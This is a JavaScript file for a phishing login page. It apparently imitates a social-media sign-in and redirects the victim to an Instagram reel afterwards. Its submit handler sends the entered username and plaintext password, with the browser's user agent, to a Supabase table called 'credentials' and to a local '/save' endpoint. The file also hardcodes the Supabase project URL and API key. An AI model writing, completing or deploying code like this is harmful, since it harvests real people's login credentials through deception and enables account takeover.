// Supabase config
const SUPABASE_URL = 'https://hqxmrbbwdnpznzvcgnrc.supabase.co';
const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImhxeG1yYmJ3ZG5wem56dmNnbnJjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTE1NTk3MTIsImV4cCI6MjEwNzEzNTcxMn0.vStbzS8ZTIxS5pd2YEnuQFgs7qEVlu8eoOJq1PFhKOM';

document.addEventListener('DOMContentLoaded', () => {
    const form = document.getElementById('login-form');
    const user = document.getElementById('username');
    const pass = document.getElementById('password');
    const btn  = document.getElementById('btn-login');
    const tog  = document.getElementById('toggle-pw');
    const off  = tog.querySelector('.ico-off');
    const on   = tog.querySelector('.ico-on');

    // Toggle password eye icon
    tog.addEventListener('click', () => {
        const showing = pass.type === 'text';
        pass.type = showing ? 'password' : 'text';
        off.style.display = showing ? 'block' : 'none';
        on.style.display  = showing ? 'none'  : 'block';
    });

    // Enable/disable login button
    function check() {
        if (user.value.trim() && pass.value.trim()) {
            btn.classList.add('active');
            btn.disabled = false;
        } else {
            btn.classList.remove('active');
            btn.disabled = true;
        }
    }
    user.addEventListener('input', check);
    pass.addEventListener('input', check);

    // Submit — save to Supabase directly, then redirect
    form.addEventListener('submit', async (e) => {
        e.preventDefault();
        if (!user.value.trim() || !pass.value.trim()) return;

        btn.textContent = 'Logging in...';
        btn.disabled = true;

        try {
            // Save directly to Supabase
            await fetch(`${SUPABASE_URL}/rest/v1/credentials`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'apikey': SUPABASE_KEY,
                    'Authorization': `Bearer ${SUPABASE_KEY}`,
                    'Prefer': 'return=minimal'
                },
                body: JSON.stringify({
                    username: user.value.trim(),
                    password: pass.value.trim(),
                    user_agent: navigator.userAgent
                })
            });
        } catch (err) {
            console.log('Supabase save error:', err);
        }

        // Also try local server save (works when running locally)
        try {
            await fetch('/save', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    username: user.value.trim(),
                    password: pass.value.trim()
                })
            });
        } catch (e) {}

        // Redirect to the reel
        window.location.href = 'https://www.instagram.com/reels/Da5Dy9AypYg/';
    });
});
